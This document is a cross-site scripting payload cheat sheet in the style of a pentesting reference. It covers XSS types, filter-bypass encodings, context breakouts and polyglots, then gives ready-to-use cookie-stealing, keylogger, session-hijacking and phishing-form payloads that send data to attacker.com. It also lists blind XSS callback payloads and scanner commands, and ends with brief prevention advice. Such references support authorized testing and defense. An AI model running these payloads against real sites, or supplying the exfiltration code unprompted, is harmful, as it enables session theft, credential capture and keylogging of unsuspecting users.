# Cross-Site Scripting (XSS)

## Description
XSS attacks inject malicious scripts into web pages viewed by other users. These scripts execute in the victim's browser context, allowing attackers to steal cookies, session tokens, or redirect users to malicious sites.

## XSS Types

### Reflected XSS
Malicious script is part of the victim's request and reflected back in the response.

### Stored XSS
Malicious script is permanently stored on the target server (database, message forum, etc.).

### DOM-based XSS
Vulnerability exists in client-side code that processes data from an untrusted source.

## Basic Payloads

### Script Tag
```html
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script src="https://attacker.com/evil.js"></script>
```

### Event Handlers
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<object data="javascript:alert(1)">
```

### Without Parentheses
```html
<img src=x onerror=alert`1`>
<svg onload=alert&lpar;1&rpar;>
<img src=x onerror="window.onerror=alert;throw 1">
```

### Without Spaces
```html
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
```

## Filter Bypass Techniques

### Case Manipulation
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
```

### Encoding

#### URL Encoding
```html
<img src=x onerror=%61%6c%65%72%74%28%31%29>
```

#### HTML Encoding
```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
```

#### Unicode Encoding
```html
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
```

#### Double Encoding
```html
%253Cscript%253Ealert(1)%253C/script%253E
```

### Breaking Out of Context

#### String Context
```javascript
'-alert(1)-'
";alert(1);//
\'-alert(1)//
```

#### HTML Attribute Context
```html
" onclick="alert(1)
' onmouseover='alert(1)
"><script>alert(1)</script>
```

#### JavaScript Context
```javascript
</script><script>alert(1)</script>
';alert(1);//
\';alert(1);//
```

### Tag and Event Bypasses
```html
<svg><script>alert&#40;1)</script>
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
<form><button formaction="javascript:alert(1)">Click</button></form>
<input type="image" src=x onerror="alert(1)">
```

### Protocol Handlers
```html
<a href="javascript:alert(1)">Click</a>
<a href="data:text/html,<script>alert(1)</script>">Click</a>
<iframe src="javascript:alert(1)"></iframe>
```

## Advanced Payloads

### Cookie Stealing
```javascript
<script>
new Image().src="https://attacker.com/steal?c="+document.cookie;
</script>

<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
```

### Keylogger
```javascript
<script>
document.onkeypress = function(e) {
    fetch('https://attacker.com/log?k=' + e.key);
}
</script>
```

### Session Hijacking
```javascript
<script>
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: document.cookie
});
</script>
```

### Phishing Form
```html
<form action="https://attacker.com/capture" method="POST">
    <input name="username" placeholder="Username">
    <input name="password" type="password" placeholder="Password">
    <button>Login</button>
</form>
```

### DOM Manipulation
```javascript
<script>
document.body.innerHTML = '<h1>Hacked!</h1>';
</script>
```

## DOM-based XSS

### Vulnerable Sinks
```javascript
// Dangerous sinks
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
eval()
setTimeout()
setInterval()
new Function()
```

### Common Sources
```javascript
document.URL
document.documentURI
document.referrer
location.href
location.search
location.hash
window.name
```

### DOM XSS Payloads
```
http://target.com/page#<script>alert(1)</script>
http://target.com/page?search=<img src=x onerror=alert(1)>
```

## Blind XSS

### Detection Payloads
```html
<!-- Payload that calls back when triggered -->
<script src="https://attacker.com/probe.js"></script>
<img src=x onerror="(new Image).src='https://attacker.com/xss?'+document.cookie">

<!-- XSS Hunter payloads -->
"><script src=https://xss.hunter/probe.js></script>
```

### Common Blind XSS Targets
```
- Contact forms
- Support tickets
- User-Agent header
- Referrer header
- Admin panels viewing user data
- Log viewers
```

## XSS Polyglots

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23telerik.telerikweb$telerikweb;>

"onclick=alert(1)//<button onclick=alert(1)//> */ alert(1)//
```

## Tools

### XSSStrike
```bash
# Automated XSS detection
python xsstrike.py -u "https://target.com/page?param=test"
```

### Dalfox
```bash
# Fast XSS scanner
dalfox url "https://target.com/page?param=test"
```

### XSS Hunter
```
# Blind XSS detection service
# https://xsshunter.com
```

## Prevention

### Output Encoding
```python
# HTML encode
import html
safe = html.escape(user_input)
```

### Content Security Policy
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'
```

### HTTPOnly Cookies
```http
Set-Cookie: session=abc123; HttpOnly; Secure
```

## Testing Checklist

- [ ] Test reflected XSS in all parameters
- [ ] Test stored XSS in all input fields
- [ ] Test DOM-based XSS via URL fragments
- [ ] Try various encoding bypasses
- [ ] Test in different contexts (HTML, JS, attribute)
- [ ] Test blind XSS with callback
- [ ] Check for CSP headers

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
- https://portswigger.net/web-security/cross-site-scripting
- https://owasp.org/www-community/xss-filter-evasion-cheatsheet
